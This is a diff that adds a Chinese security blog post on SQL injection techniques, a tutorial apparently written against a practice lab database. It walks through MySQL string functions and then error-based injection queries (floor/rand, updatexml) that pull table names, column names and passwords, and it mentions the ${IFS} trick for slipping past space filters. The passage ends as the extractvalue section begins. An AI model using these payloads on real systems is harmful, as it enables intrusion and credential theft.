@@ -1,0 +1,1175 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="sql注入,漏洞," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hello_C技术博客" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="0x01 SQL注入1、连接符:mysql 空格，Oracle ||,sql server +2、黑魔法${IFS}，Linux下可以使用其代替空格">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入技巧">
+<meta property="og:url" content="http://yoursite.com/漏洞/2017/07/01/SQL注入技巧.html">
+<meta property="og:site_name" content="Hello_C技术博客">
+<meta property="og:description" content="0x01 SQL注入1、连接符:mysql 空格，Oracle ||,sql server +2、黑魔法${IFS}，Linux下可以使用其代替空格">
+<meta property="og:updated_time" content="2017-07-01T13:59:17.451Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入技巧">
+<meta name="twitter:description" content="0x01 SQL注入1、连接符:mysql 空格，Oracle ||,sql server +2、黑魔法${IFS}，Linux下可以使用其代替空格">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/漏洞/2017/07/01/SQL注入技巧.html"/>
+
+
+
+
+
+  <title>SQL注入技巧 | Hello_C技术博客</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=1261655448&web_id=1261655448" language="JavaScript"></script>
+  </div>
+
+
+
+
+
+</head>
+
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hello_C技术博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">一个小白的独白！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-secpage">
+          <a href="/secpage/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            安全导航
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/漏洞/2017/07/01/SQL注入技巧.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Hello_C">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello_C技术博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL注入技巧</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-01T21:27:25+08:00">
+                2017-07-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/漏洞/2017/07/01/SQL注入技巧.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="漏洞/2017/07/01/SQL注入技巧.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/漏洞/2017/07/01/SQL注入技巧.html" class="leancloud_visitors" data-flag-title="SQL注入技巧">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度 </span>
+               
+                 <span class="leancloud-visitors-count">℃</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  1,404 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  8 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h3><p>1、连接符:mysql 空格，Oracle ||,sql server +<br>2、黑魔法${IFS}，Linux下可以使用其代替空格</p>
+<a id="more"></a>
+<h3 id="0x02-相关函数"><a href="#0x02-相关函数" class="headerlink" title="0x02 相关函数"></a>0x02 相关函数</h3><p>参考数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  1 | Dumb     | Dumb       |</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">|  4 | secure   | crappy     |</div><div class="line">|  5 | stupid   | stupidity  |</div><div class="line">|  6 | superman | genious    |</div><div class="line">|  7 | batman   | mob!le     |</div><div class="line">|  8 | admin    | admin      |</div><div class="line">|  9 | admin1   | admin1     |</div><div class="line">| 10 | admin2   | admin2     |</div><div class="line">| 11 | admin3   | admin3     |</div><div class="line">| 12 | dhakkan  | dumbo      |</div><div class="line">| 14 | admin4   | admin4     |</div><div class="line">+----+----------+------------+</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>mid()   从文本字段中提取字符</p>
+</blockquote>
+<p>SELECT MID(column_name,start[,length]) FROM table_name;<br>column_name    必需。要提取字符的字段。<br>start    必需。规定开始位置（起始值是 1）。<br>length    可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select mid(username,1,2) from users;</div><div class="line">+-------------------+</div><div class="line">| mid(username,1,2) |</div><div class="line">+-------------------+</div><div class="line">| Du                |</div><div class="line">| An                |</div><div class="line">| Du                |</div><div class="line">| se                |</div><div class="line">| st                |</div><div class="line">| su                |</div><div class="line">| ba                |</div><div class="line">| ad                |</div><div class="line">| ad                |</div><div class="line">| ad                |</div><div class="line">| ad                |</div><div class="line">| dh                |</div><div class="line">| ad                |</div><div class="line">+-------------------+</div><div class="line">mysql&gt; select mid(username,2) from users;</div><div class="line">+-----------------+</div><div class="line">| mid(username,2) |</div><div class="line">+-----------------+</div><div class="line">| umb             |</div><div class="line">| ngelina         |</div><div class="line">| ummy            |</div><div class="line">| ecure           |</div><div class="line">| tupid           |</div><div class="line">| uperman         |</div><div class="line">| atman           |</div><div class="line">| dmin            |</div><div class="line">| dmin1           |</div><div class="line">| dmin2           |</div><div class="line">| dmin3           |</div><div class="line">| hakkan          |</div><div class="line">| dmin4           |</div><div class="line">+-----------------+</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>limit() 返回前几条或者中间某几行数据</p>
+</blockquote>
+<p>select * from table limit m,n    其m指记录始index0始表示第条记录 n指第m+1条始取n条<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from users limit 1,2;</div><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">+----+----------+------------+</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>concat与concat_ws与group_concat</p>
+</blockquote>
+<p>  MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select concat(&apos;123&apos;,null);</div><div class="line">+--------------------+</div><div class="line">| concat(&apos;123&apos;,null) |</div><div class="line">+--------------------+</div><div class="line">| NULL               |</div><div class="line">+--------------------+</div><div class="line">mysql&gt; select concat(&apos;123&apos;,&apos;456&apos;);</div><div class="line">+---------------------+</div><div class="line">| concat(&apos;123&apos;,&apos;456&apos;) |</div><div class="line">+---------------------+</div><div class="line">| 123456              |</div><div class="line">+---------------------+</div></pre></td></tr></table></figure></p>
+<p>和concat不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select concat_ws(&apos;123&apos;,null);</div><div class="line">+-----------------------+</div><div class="line">| concat_ws(&apos;123&apos;,null) |</div><div class="line">+-----------------------+</div><div class="line">|                       |</div><div class="line">+-----------------------+</div><div class="line">mysql&gt; select concat_ws(&apos;123&apos;,&apos;456&apos;);</div><div class="line">+------------------------+</div><div class="line">| concat_ws(&apos;123&apos;,&apos;456&apos;) |</div><div class="line">+------------------------+</div><div class="line">| 456                    |</div><div class="line">+------------------------+</div><div class="line">mysql&gt; select concat_ws(&apos;.&apos;,&apos;123&apos;,&apos;456&apos;);</div><div class="line">+----------------------------+</div><div class="line">| concat_ws(&apos;.&apos;,&apos;123&apos;,&apos;456&apos;) |</div><div class="line">+----------------------------+</div><div class="line">| 123.456                    |</div><div class="line">+----------------------------+</div></pre></td></tr></table></figure></p>
+<p>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from aa;  </div><div class="line">+------+------+</div><div class="line">| id| name |</div><div class="line">+------+------+</div><div class="line">|1 | 10|</div><div class="line">|1 | 20|</div><div class="line">|1 | 20|</div><div class="line">|2 | 20|</div><div class="line">|3 | 200 |</div><div class="line">|3 | 500 |</div><div class="line">+------+------+</div><div class="line">mysql&gt;select id,group_concat(name) from aa group by id;  </div><div class="line">+------+--------------------+</div><div class="line">| id| group_concat(name) |</div><div class="line">+------+--------------------+</div><div class="line">|1 | 10,20,20|</div><div class="line">|2 | 20 |</div><div class="line">|3 | 200,500|</div><div class="line">+------+--------------------+</div></pre></td></tr></table></figure></p>
+<blockquote>
+<p>Count() 聚集函数，统计元祖的个数</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*) from users;</div><div class="line">+----------+</div><div class="line">| count(*) |</div><div class="line">+----------+</div><div class="line">|       13 |</div><div class="line">+----------+</div></pre></td></tr></table></figure>
+<blockquote>
+<p>rand() 用于产生一个0~1的随机数</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select rand(),rand();</div><div class="line">+---------------------+--------------------+</div><div class="line">| rand()              | rand()             |</div><div class="line">+---------------------+--------------------+</div><div class="line">| 0.37330908176797356 | 0.7865611089268337 |</div><div class="line">+---------------------+--------------------+</div><div class="line">mysql&gt; select * from users group by rand();</div><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">|  9 | admin1   | admin1     |</div><div class="line">| 12 | dhakkan  | dumbo      |</div><div class="line">|  5 | stupid   | stupidity  |</div><div class="line">|  4 | secure   | crappy     |</div><div class="line">| 10 | admin2   | admin2     |</div><div class="line">|  6 | superman | genious    |</div><div class="line">| 14 | admin4   | admin4     |</div><div class="line">| 11 | admin3   | admin3     |</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  8 | admin    | admin      |</div><div class="line">|  1 | Dumb     | Dumb       |</div><div class="line">|  7 | batman   | mob!le     |</div><div class="line">+----+----------+------------+</div></pre></td></tr></table></figure>
+<blockquote>
+<p>floor()   向下取整 </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select floor(123.456),floor(-123.456);</div><div class="line">+----------------+-----------------+</div><div class="line">| floor(123.456) | floor(-123.456) |</div><div class="line">+----------------+-----------------+</div><div class="line">|            123 |            -124 |</div><div class="line">+----------------+-----------------+</div></pre></td></tr></table></figure>
+<blockquote>
+<p>group by 依据我们想要的规则对结果进行分组</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from users group by username;</div><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  8 | admin    | admin      |</div><div class="line">|  9 | admin1   | admin1     |</div><div class="line">| 10 | admin2   | admin2     |</div><div class="line">| 11 | admin3   | admin3     |</div><div class="line">| 14 | admin4   | admin4     |</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  7 | batman   | mob!le     |</div><div class="line">| 12 | dhakkan  | dumbo      |</div><div class="line">|  1 | Dumb     | Dumb       |</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">|  4 | secure   | crappy     |</div><div class="line">|  5 | stupid   | stupidity  |</div><div class="line">|  6 | superman | genious    |</div><div class="line">+----+----------+------------+</div></pre></td></tr></table></figure>
+<blockquote>
+<p>length()  返回字符串的长度</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select length(&apos;www.baidu.com&apos;);</div><div class="line">+-------------------------+</div><div class="line">| length(&apos;www.baidu.com&apos;) |</div><div class="line">+-------------------------+</div><div class="line">|                      13 |</div><div class="line">+-------------------------+</div><div class="line">mysql&gt; select * from users where length(username) &lt;6;</div><div class="line">+----+----------+----------+</div><div class="line">| id | username | password |</div><div class="line">+----+----------+----------+</div><div class="line">|  1 | Dumb     | Dumb     |</div><div class="line">|  3 | Dummy    | p@ssword |</div><div class="line">|  8 | admin    | admin    |</div><div class="line">+----+----------+----------+</div></pre></td></tr></table></figure>
+<blockquote>
+<p>Substr()  截取字符串  三个参数  （所要截取字符串，截取的位置，截取的长度）</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select substr(&apos;123456&apos;,2,3);</div><div class="line">+----------------------+</div><div class="line">| substr(&apos;123456&apos;,2,3) |</div><div class="line">+----------------------+</div><div class="line">| 234                  |</div><div class="line">+----------------------+</div><div class="line">mysql&gt; select substr(username,2,3) from users ;</div><div class="line">+----------------------+</div><div class="line">| substr(username,2,3) |</div><div class="line">+----------------------+</div><div class="line">| umb                  |</div><div class="line">| nge                  |</div><div class="line">| umm                  |</div><div class="line">| ecu                  |</div><div class="line">| tup                  |</div><div class="line">| upe                  |</div><div class="line">| atm                  |</div><div class="line">| dmi                  |</div><div class="line">| dmi                  |</div><div class="line">| dmi                  |</div><div class="line">| dmi                  |</div><div class="line">| hak                  |</div><div class="line">| dmi                  |</div><div class="line">+----------------------+</div></pre></td></tr></table></figure>
+<blockquote>
+<p>Ascii()   返回字符串的ascii码</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select ascii(2);</div><div class="line">+----------+</div><div class="line">| ascii(2) |</div><div class="line">+----------+</div><div class="line">|       50 |</div><div class="line">+----------+</div><div class="line">mysql&gt; select ascii(substr(username,2,1)) from users;</div><div class="line">+-----------------------------+</div><div class="line">| ascii(substr(username,2,1)) |</div><div class="line">+-----------------------------+</div><div class="line">|                         117 |</div><div class="line">|                         110 |</div><div class="line">|                         117 |</div><div class="line">|                         101 |</div><div class="line">|                         116 |</div><div class="line">|                         117 |</div><div class="line">|                          97 |</div><div class="line">|                         100 |</div><div class="line">|                         100 |</div><div class="line">|                         100 |</div><div class="line">|                         100 |</div><div class="line">|                         104 |</div><div class="line">|                         100 |</div><div class="line">+-----------------------------+</div></pre></td></tr></table></figure>
+<h3 id="0x03-基于报错注入"><a href="#0x03-基于报错注入" class="headerlink" title="0x03 基于报错注入"></a>0x03 基于报错注入</h3><p>常用floor，UpdateXml(有长度限制,最长32位)，ExtractValue(有长度限制,最长32位)</p>
+<blockquote>
+<p>floor报错</p>
+</blockquote>
+<ul>
+<li><p>获取数据库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*),(concat(0x3a,database(),0x3a,floor(rand()*2))) name from information_schema.tables group by name;</div><div class="line">+----------+-------------+</div><div class="line">| count(*) | name        |</div><div class="line">+----------+-------------+</div><div class="line">|       58 | :security:0 |</div><div class="line">|       47 | :security:1 |</div><div class="line">+----------+-------------+</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x3a,floor(rand()*2)) name from information_schema.tables group by name;</div><div class="line">+----------+-----------+</div><div class="line">| count(*) | name      |</div><div class="line">+----------+-----------+</div><div class="line">|       44 | ::users:0 |</div><div class="line">|       61 | ::users:1 |</div><div class="line">+----------+-----------+</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取字段名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x3a,floor(rand()*2)) name from information_schema.tables group by name;</div><div class="line">+----------+-------------+</div><div class="line">| count(*) | name        |</div><div class="line">+----------+-------------+</div><div class="line">|       51 | ::user_id:0 |</div><div class="line">|       54 | ::user_id:1 |</div><div class="line">+----------+-------------+</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*),concat(0x3a,0x3a,(select username from users limit 0,1),0x3a,floor(rand()*2)) name from information_schema.tables group by name;</div><div class="line">+----------+----------+</div><div class="line">| count(*) | name     |</div><div class="line">+----------+----------+</div><div class="line">|       46 | ::Dumb:0 |</div><div class="line">|       59 | ::Dumb:1 |</div><div class="line">+----------+----------+</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<blockquote>
+<p>UpdateXml报错</p>
+</blockquote>
+<ul>
+<li><p>获取表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 3,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~users&apos;</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos; limit 4,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~password&apos;</div><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos; limit 3,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~user&apos;</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(password) FROM users limit 0,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~Dumb&apos;</div><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(password) FROM users limit 1,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~I-kill-you&apos;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<blockquote>
+<p>extractvalue报错</p>
